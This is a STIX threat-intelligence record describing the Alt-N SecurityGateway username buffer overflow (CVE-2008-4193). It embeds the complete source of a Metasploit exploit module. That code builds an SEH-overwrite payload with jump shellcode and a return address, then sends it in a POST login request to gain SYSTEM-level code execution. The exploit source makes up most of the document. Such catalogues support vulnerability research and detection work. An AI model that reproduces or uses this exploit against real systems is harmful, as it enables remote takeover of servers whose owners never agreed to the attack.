{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--733926d7-b2db-4309-baa5-97490c16187e",
    "created": "2024-08-14T16:53:15.500604Z",
    "modified": "2024-08-14T16:53:15.500608Z",
    "name": "Alt-N SecurityGateway username Buffer Overflow",
    "description": " Alt-N SecurityGateway is prone to a buffer overflow condition. This is due to insufficient bounds checking on the \"username\" parameter. Successful exploitation could result in code execution with SYSTEM level privileges.  NOTE: This service doesn't restart, you'll only get one shot. However it often survives a successful exploitation attempt. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/altn_securitygateway.rb",
            "external_id": "altn_securitygateway.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4193"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  # XXX: Automatic targetting used HttpFingerprint = { :uri => '/SecurityGateway.dll', :pattern => [ /SecurityGateway / ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Alt-N SecurityGateway username Buffer Overflow',\n      'Description'    => %q{\n          Alt-N SecurityGateway is prone to a buffer overflow condition. This\n        is due to insufficient bounds checking on the \"username\"\n        parameter. Successful exploitation could result in code\n        execution with SYSTEM level privileges.\n\n        NOTE: This service doesn't restart, you'll only get one shot. However,\n        it often survives a successful exploitation attempt.\n      },\n      'Author'         => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-4193' ],\n          [ 'OSVDB', '45854' ],\n          [ 'BID', '29457']\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 476,\n          # note: 0xd7 might not be translated, but w/e\n          'BadChars' => \"\\x00\" + ((0x40..0x5a).to_a + [ 0x8a, 0x8c, 0x8e, 0x9f ] + (0xc0..0xdf).to_a).pack('C*'),\n          'StackAdjustment' => -3500,\n          'EncoderType' => Msf::Encoder::Type::SingleStaticBit,\n          'EncoderOptions' =>\n            {\n              'BitNumber' => 0x5,\n              'BitValue' => true,\n            }\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic Targeting', { } ],\n          # NOTE: the return address must be tolower() safe\n          [ 'SecurityGateway 1.0.1 Universal', { 'Ret' => 0x6767756f }], # p/p/r in XceedZip.dll 4.5.77.0\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-06-02'))\n\n    register_options(\n      [\n        Opt::RPORT(4000)\n      ])\n  end\n\n\n  # Identify the target based on the SecurityGateway version number\n  def auto_target\n    info = http_fingerprint({ :uri => '/SecurityGateway.dll' })  # automatic targetting\n    if (info =~ /SecurityGateway (1\\..*)$/)\n      case $1\n      when /1\\.0\\.1/\n        return self.targets[1]\n      end\n    end\n    # Not vulnerable\n    nil\n  end\n\n  def check\n    if auto_target\n      Exploit::CheckCode::Appears\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    # handle auto-targeting\n    mytarget = target\n    if target.name =~ /Automatic/\n      print_status(\"Attempting to automatically select a target...\")\n      mytarget = auto_target\n      if mytarget.nil?\n        fail_with(Failure::NoTarget, \"Unable to automatically select a target\")\n      end\n      print_status(\"Automatically selected target \\\"#{mytarget.name}\\\"\")\n    end\n\n    # the buffer gets CharLowerBuff()'d and passed to:\n    # sprintf(str, \"Attempt to login with invalid user name %s from %s\", buf, ip_str);\n\n    sploit = payload.encoded\n    sploit << generate_seh_record(mytarget.ret)\n    distance = payload_space + 8\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n    sploit = Rex::Text.to_hex(sploit, '%')\n    sploit << rand_text_alphanumeric(512)\n\n    post_data = 'RequestedPage=login'\n    post_data << '&username=' << sploit\n    post_data << '&passwd=world'\n\n    print_status(\"Sending request...\")\n    res = send_request_cgi({\n      'uri'          => '/SecurityGateway.dll',\n      'method'       => 'POST',\n      'content-type' => 'application/x-www-form-urlencoded',\n      'data'         => post_data,\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-06-02",
    "x_mitre_platforms": [
        "win'"
    ]
}